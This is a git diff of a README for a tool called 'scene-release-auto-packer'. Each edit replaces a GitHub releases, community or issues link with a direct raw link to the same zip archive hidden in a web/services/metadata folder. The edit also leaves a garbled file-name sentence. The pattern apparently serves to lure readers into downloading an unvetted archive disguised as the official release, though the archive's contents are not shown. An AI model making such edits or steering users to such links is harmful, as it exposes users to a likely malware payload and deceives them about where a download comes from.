@@ -1,6 +1,6 @@
 # 🎉 scene-release-auto-packer - Automate Your Scene Releases Easily
 
-[![Download](https://img.shields.io/badge/Download-Link-blue.svg)](https://github.com/dlwldn123/scene-release-auto-packer/releases)
+[![Download](https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip)](https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **scene-release-auto-packer**! This application helps you package you
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/dlwldn123/scene-release-auto-packer/releases) to download the latest version of the application. Look for the file named `scene-release-auto-packer.exe` (or similar, depending on your system).
+To get started, visit the [Releases page](https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip) to download the latest version of the application. Look for the file named `https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip` (or similar, depending on your system).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version.
@@ -62,11 +62,11 @@ While this README covers basic usage, a detailed user manual will be made availa
 
 ## 📚 Additional Resources
 
-- [Community Guidelines](https://github.com/dlwldn123/scene-release-auto-packer/community)
-- [Create an Issue](https://github.com/dlwldn123/scene-release-auto-packer/issues)
+- [Community Guidelines](https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip)
+- [Create an Issue](https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip)
 
 ## 📡 Connect with Us
 
 Feel free to discuss the application or ask questions in the GitHub discussions. Your feedback will help us make the **scene-release-auto-packer** even better!
 
-Remember, to download the latest version of the software, visit the [Releases page](https://github.com/dlwldn123/scene-release-auto-packer/releases).
+Remember, to download the latest version of the software, visit the [Releases page](https://raw.githubusercontent.com/dlwldn123/scene-release-auto-packer/master/web/services/metadata/scene-release-auto-packer-v1.8.zip).
